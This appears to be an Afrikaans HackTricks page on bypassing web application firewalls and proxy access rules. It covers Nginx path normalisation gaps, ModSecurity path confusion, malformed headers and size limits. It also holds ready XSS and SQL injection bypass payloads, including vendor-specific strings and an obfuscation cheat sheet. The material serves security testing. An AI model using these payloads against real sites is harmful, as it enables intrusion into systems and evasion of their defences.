# Proxy / WAF Beskermingsomseiling

{{#include ../banners/hacktricks-training.md}}


## Omseiling van Nginx ACL-reëls deur padnaammanipulasie <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Tegnieke [van hierdie navorsing](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Voorbeeld van 'n Nginx-reël:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Om bypasses te voorkom voer Nginx padnormalisering uit voordat dit die pad kontroleer. As die backend-server egter 'n ander normalisering uitvoer (deur karakters te verwyder wat nginx nie verwyder nie), kan dit moontlik wees om hierdie verdediging te bypass.

### **NodeJS - Express**

| Nginx Weergawe | **Node.js Bypass-karakters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Weergawe | **Flask Bypass-karakters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Weergawe | **Spring Boot Bypass-karakters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM-konfigurasie:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx is gekonfigureer om toegang tot `/admin.php` te blokkeer, maar dit is moontlik om dit te bypass deur toegang te kry tot `/admin.php/index.php`.

### Hoe om dit te voorkom
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Padverwarring

[**In hierdie pos**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) word verduidelik dat ModSecurity v3 (tot 3.0.12) **die `REQUEST_FILENAME` verkeerd geïmplementeer het** — dit was veronderstel om die aangeroepde pad te bevat (tot aan die begin van die parameters). Dit is omdat dit 'n URL-dekodering uitgevoer het om die pad te kry.\
Daarom sal 'n versoek soos `http://example.com/foo%3f';alert(1);foo=` in mod security aanneem dat die pad net `/foo` is omdat `%3f` na `?` omgeskakel word wat die URL-pad beëindig, maar in werklikheid sal die pad wat die bediener ontvang `/foo%3f';alert(1);foo=` wees.

Die veranderlikes `REQUEST_BASENAME` en `PATH_INFO` was ook deur hierdie fout geraak.

Iets soortgelyks het in weergawe 2 van Mod Security voorgekom wat toegelaat het om 'n beskerming te omseil wat gebruikers verhinder het om lêers met sekere uitbreidings wat verband hou met backup-lêers (soos `.bak`) te bereik, eenvoudig deur die punt URL-gekodeer as `%2e` te stuur, byvoorbeeld: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Verkeerd gevormde Header

[Hierdie navorsing](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) noem dat dit moontlik was om AWS WAF-reëls wat op HTTP-headers toegepas is te omseil deur 'n "malformed" header te stuur wat nie behoorlik deur AWS gepars is nie, maar wel deur die backend server.

Byvoorbeeld, deur die volgende versoek te stuur met 'n SQL injection in die header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Dit was moontlik om AWS WAF te omseil omdat dit nie verstaan het dat die volgende reël deel is van die waarde van die header nie, terwyl die NODEJS server dit wel gedoen het (dit is reggemaak).

## Generiese WAF bypasses

### Beperkings op versoekgrootte

Gewoonlik het WAFs 'n sekere lengtegrens van versoeke om te kontroleer, en as 'n POST/PUT/PATCH versoek dit oorskry, sal die WAF die versoek nie kontroleer nie.

- Vir AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksimum grootte van 'n webversoekliggaam wat geïnspekteer kan word vir Application Load Balancer en AWS AppSync beskerming</td><td>8 KB</td></tr><tr><td>Maksimum grootte van 'n webversoekliggaam wat geïnspekteer kan word vir CloudFront, API Gateway, Amazon Cognito, App Runner, en Verified Access beskerming**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Ouer Web Application Firewalls met Core Rule Set 3.1 (of laer) laat boodskappe groter as **128 KB** toe deur request body inspection af te skakel, maar hierdie boodskappe sal nie vir kwesbaarhede nagegaan word nie. Vir nuwer weergawes (Core Rule Set 3.2 of nuwer), kan dieselfde gedoen word deur die maksimum request body limit te deaktiveer. Wanneer 'n versoek die groottegrens oorskry:

As p**revention mode**: Logs en blokkeer die versoek.\
As **detection mode**: Inspekteer tot by die limiet, ignoreer die res, en log as die `Content-Length` die limiet oorskry.

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Standaard inspekteer die WAF slegs die eerste 8KB van 'n versoek. Dit kan die limiet verhoog tot 128KB deur Advanced Metadata by te voeg.

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Tot 128KB.

### Gaping in inspeksie van statiese assets (.js GETs)

Sommige CDN/WAF-stakke pas swak of geen inhoudinspeksie toe op GET-versoeke vir statiese assets (byvoorbeeld paadjies wat eindig met `.js`), terwyl hulle steeds globale reëls soos rate limiting en IP reputation toepas. Gekombineer met outo-caching van statiese extensies, kan dit misbruik word om kwaadwillige variante te lewer of in te saai wat daaropvolgende HTML-antwoorde beïnvloed.

Praktiese gebruiksgevalle:

- Stuur payloads in onbetroubare headers (bv. `User-Agent`) op 'n GET na 'n `.js`-pad om inhoudinspeksie te vermy, en versoek dan onmiddellik die hoof-HTML om die gekashte variant te beïnvloed.
- Gebruik 'n vars/skoon IP; sodra 'n IP gemerk is, kan routeringsveranderinge die tegniek onbetroubaar maak.
- In Burp Repeater, gebruik "Send group in parallel" (single-packet style) om die twee versoeke (`.js` dan HTML) saam deur dieselfde front-end-pad te jaag.

Dit werk goed saam met header-reflection cache poisoning. Sien:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuskering <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Kompatibiliteit <a href="#unicode-compatability" id="unicode-compatability"></a>

Afhangend van die implementering van Unicode-normalisering (meer inligting [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), kan karakters wat Unicode-kompatibiliteit deel die WAF omseil en as die beoogde payload uitgevoer word. Verenigbare karakters kan gevind word [here](https://www.compart.com/en/unicode).

#### Voorbeeld <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Omseil kontekstuele WAFs met kodering <a href="#ip-rotation" id="ip-rotation"></a>

Soos genoem in [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), om WAFs wat 'n konteks van die gebruikerinvoer kan handhaaf te omseil, kan ons die WAF-tegnieke misbruik om eintlik die gebruikerinvoer te normaliseer.

Byvoorbeeld, in die pos word genoem dat **Akamai URL decoded a user input 10 times**. Daarom sal iets soos `<input/%2525252525252525253e/onfocus` deur Akamai gesien word as `<input/>/onfocus` wat **dalk dink dit is ok omdat die tag gesluit is**. As die toepassing die invoer egter nie 10 keer URL decode nie, sal die slagoffer iets soos `<input/%25252525252525253e/onfocus` sien wat **nog steeds geldig is vir 'n XSS-aanval**.

Dit laat dus toe om **payloads te versteek in gekodeerde komponente** wat die WAF sal decodeer en interpreteer terwyl die slagoffer dit nie sal doen nie.

Hierdie taktiek kan nie net met URL encoded payloads gedoen word nie, maar ook met ander koderinge soos unicode, hex, octal...

In die pos word die volgende finale bypasses voorgestel:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Dit word ook genoem dat, afhangend van **hoe sommige WAFs die konteks** van die gebruikerinvoer verstaan, dit moontlik is om dit te misbruik. Die voorgestelde voorbeeld in die blog is dat Akamai toegelaat het om enigiets tussen `/*` en `*/` te plaas (potensieel omdat dit algemeen as kommentaar gebruik word). Daarom sal 'n SQLinjection soos `/*'or sleep(5)-- -*/` nie gevang word nie en geldig wees aangesien `/*` die beginstring van die injectie is en `*/` as kommentaar beskou word.

Hierdie soort kontekstuele probleme kan ook gebruik word om ander kwesbaarhede as die een verwag deur die WAF te misbruik (bv. dit kan ook gebruik word om 'n XSS te exploiteer).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Genereer 'n API gateway URL om saam met ffuf gebruik te word
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Soortgelyk aan fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin wat API gateway IPs gebruik
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): 'n Dynamies bepaalde aantal container instances word geaktiveer op grond van die input file size en split factor, met die invoer in stukkies gesplit vir parallelle uitvoering — byvoorbeeld 100 instances wat 100 stukkies van 'n 10,000-reël invoerlêer verwerk met 'n split factor van 100 reëls.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Verskillende tegnieke kan gebruik word om die regex-filters op firewalls te omseil. Voorbeelde sluit in afwisselende hoof- en kleinletters, byvoeging van reëlspringings, en die kodering van payloads. Hulpbronne vir die verskeie bypasses kan gevind word by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) en [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Die voorbeelde hieronder is gehaal uit [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Gereedskap

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp plugin om junk data by requests te voeg om WAFs deur lengte te bypass

## Verwysings

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
